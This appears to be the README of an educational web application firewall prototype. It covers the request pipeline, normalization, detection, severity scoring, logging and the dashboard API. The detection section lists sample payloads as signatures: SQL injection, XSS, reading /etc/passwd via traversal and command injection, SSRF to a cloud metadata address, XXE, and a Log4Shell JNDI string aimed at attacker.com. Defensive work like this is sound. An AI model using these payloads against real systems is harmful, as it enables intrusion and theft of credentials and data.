CloudFort WAF

CloudFort WAF is a cloud-based Web Application Firewall (WAF) prototype designed to protect web applications against common application-layer attacks through reverse proxy protection, request inspection, attack detection, rate limiting, IP blacklisting, structured logging, and real-time monitoring.

The project demonstrates how a modern Web Application Firewall can inspect HTTP requests before they reach a protected application, identify malicious payloads, block threats, and provide visibility through an administrative dashboard.

⸻

Features

Security Features

* Reverse Proxy Protection
* HTTP Request Inspection
* Payload Normalization
* SQL Injection Detection
* Cross-Site Scripting (XSS) Detection
* Path Traversal Detection
* Command Injection Detection
* Server-Side Request Forgery (SSRF) Detection
* XML External Entity (XXE) Detection
* Log4Shell-style Payload Detection
* Suspicious User-Agent Detection
* Severity-Based Blocking Decisions
* Rate Limiting
* Manual IP Blacklisting
* Automatic IP Blacklisting
* Structured Attack Logging
* Security Header Injection

Monitoring Features

* Attack Statistics Dashboard
* Real-Time Attack Visibility
* Top Attackers Monitoring
* Hourly Attack Activity Tracking
* Detailed Attack Logs
* Blacklist Management

⸻

Project Architecture

The system consists of three major components:

1. CloudFort WAF Backend

Built using FastAPI and acts as a reverse proxy security gateway.

Responsibilities:

* Receive all incoming HTTP requests
* Extract client IP addresses
* Check blacklist status
* Apply rate limiting
* Normalize request payloads
* Run attack detection rules
* Calculate severity scores
* Block malicious requests
* Forward clean requests
* Store security events
* Provide dashboard APIs
* Inject security headers

⸻

2. NexaStore Protected Application

NexaStore is a demo e-commerce application that represents the protected target.

The application never receives direct traffic from users. All requests must pass through CloudFort WAF first.

⸻

3. React Monitoring Dashboard

The dashboard provides administrators with visibility into security events.

Dashboard capabilities include:

* Total detected attacks
* Unique attacker count
* Attack category distribution
* Top attacker IP addresses
* Blacklisted IP management
* Detailed attack logs
* Activity trends

⸻

Request Processing Pipeline

Every incoming request passes through the following stages:

Step 1 – Client IP Identification

CloudFort extracts the source IP address from the request.

This IP is used for:

* Rate limiting
* Blacklist validation
* Logging

⸻

Step 2 – Request ID Generation

A unique request identifier is generated for every request.

Example:

REQ-2026-001

This simplifies attack tracking and investigation.

⸻

Step 3 – Blacklist Validation

The WAF checks whether the source IP exists in the blacklist.

If the IP is blacklisted:

403 Forbidden

is returned immediately.

⸻

Step 4 – Rate Limiting

CloudFort tracks request volume from every IP.

If a client exceeds the configured threshold:

429 Too Many Requests

is returned.

This helps mitigate:

* Brute-force attacks
* Automated scanning
* Abuse attempts
* Excessive traffic

⸻

Step 5 – Payload Extraction

The WAF extracts request data from:

* URL paths
* Query parameters
* Request bodies
* Headers
* User-Agent strings

⸻

Step 6 – Payload Normalization

Before inspection, request data is normalized.

Normalization includes:

* URL decoding
* HTML entity decoding
* Null-byte removal
* Whitespace normalization

Example:

%3Cscript%3Ealert(1)%3C/script%3E

becomes:

<script>alert(1)</script>

This reduces simple encoding-based bypass attempts.

⸻

Step 7 – Detection Engine

The detection engine evaluates the normalized payload against predefined attack signatures.

SQL Injection

Examples:

' OR 1=1 --
UNION SELECT
DROP TABLE

Cross-Site Scripting (XSS)

Examples:

<script>alert(1)</script>
<img src=x onerror=alert(1)>

Path Traversal

Examples:

../../etc/passwd

Command Injection

Examples:

; whoami
&& cat /etc/passwd

SSRF

Examples:

http://127.0.0.1
http://169.254.169.254

XXE

Examples:

<!DOCTYPE foo>
<!ENTITY xxe SYSTEM>

Log4Shell-style Payloads

Examples:

${jndi:ldap://attacker.com/a}

Suspicious User Agents

Examples:

sqlmap
nikto
acunetix

⸻

Step 8 – Severity Scoring

Each matched rule contributes to a severity score.

Example:

Attack Type	Severity
XSS	Medium
SQL Injection	High
Path Traversal	High
SSRF	High
Command Injection	Critical

The cumulative score determines whether a request should be blocked.

⸻

Step 9 – Blocking Decision

If the severity score exceeds the configured threshold:

403 Forbidden

is returned.

The request is blocked before reaching the protected application.

⸻

Step 10 – Clean Request Forwarding

Legitimate requests are forwarded to NexaStore while preserving:

* HTTP method
* Request body
* Query parameters
* Required headers

Flow:

Client
   ↓
CloudFort WAF
   ↓
NexaStore
   ↓
Response

⸻

Step 11 – Security Header Injection

Before returning the response, CloudFort injects security headers such as:

X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src 'self'

These headers strengthen browser-side security.

⸻

Attack Logging

Every detected attack is stored in SQLite.

Each log record includes:

* Request ID
* Source IP Address
* HTTP Method
* Request Path
* Attack Type
* Payload
* Severity Score
* Timestamp
* Action Taken

Example:

Field	Example
IP Address	192.168.1.10
Attack Type	SQL Injection
Method	POST
Path	/login
Severity	High
Action	Blocked

⸻

Dashboard API Endpoints

Get Attack Logs

GET /waf/attacks

Get Statistics

GET /waf/stats

Get Top Attackers

GET /waf/top-attackers

Get Blacklisted IPs

GET /waf/blacklist

Add IP to Blacklist

POST /waf/blacklist/{ip}

Remove IP from Blacklist

DELETE /waf/blacklist/{ip}

⸻

Technology Stack

Backend

* Python
* FastAPI
* Uvicorn
* HTTPX
* SQLite

Frontend

* React
* Vite
* JavaScript
* HTML
* CSS

Protected Application

* Node.js
* Express.js

Deployment

* Docker
* Railway

⸻

Repository Structure

cloudfort-waf-demo/
│
├── cloud-waf/
│   ├── app/
│   │   ├── main.py
│   │   ├── detection.py
│   │   ├── database.py
│   │   ├── blacklist.py
│   │   ├── rate_limiter.py
│   │   └── config.py
│
├── demo-site/
│   ├── server.js
│   ├── package.json
│   └── public/
│
├── waf-dashboard/
│   ├── src/
│   ├── package.json
│   └── vite.config.js
│
├── Dockerfile
├── DEPLOYMENT.md
└── README.md

⸻

Local Installation

Clone Repository

git clone https://github.com/Mazen2004212/cloudfort-waf-demo.git
cd cloudfort-waf-demo

Run Demo Application

cd demo-site
npm install
npm start

Run CloudFort WAF

cd cloud-waf/app
pip install -r requirements.txt
uvicorn main:app --reload --port 8000

Run Dashboard

cd waf-dashboard
npm install
npm run dev

⸻

Docker Deployment

Build image:

docker build -t cloudfort-waf .

Run container:

docker run -p 8000:8000 cloudfort-waf

Open:

http://localhost:8000

Dashboard:

http://localhost:8000/dashboard

⸻

Future Improvements

* Dashboard Authentication
* Role-Based Access Control (RBAC)
* PostgreSQL Integration
* Redis-Based Rate Limiting
* SIEM Integration
* Email Alerting
* GeoIP Filtering
* Advanced Rule Sets
* Kubernetes Deployment
* CI/CD Integration
* Machine Learning-Based Detection

⸻

Disclaimer

CloudFort WAF is an educational and demonstration-oriented security project. It is designed to showcase Web Application Firewall concepts, reverse proxy architecture, application-layer request inspection, attack detection, logging, monitoring, and cloud deployment.

It is not intended to replace enterprise-grade WAF products in production environments.
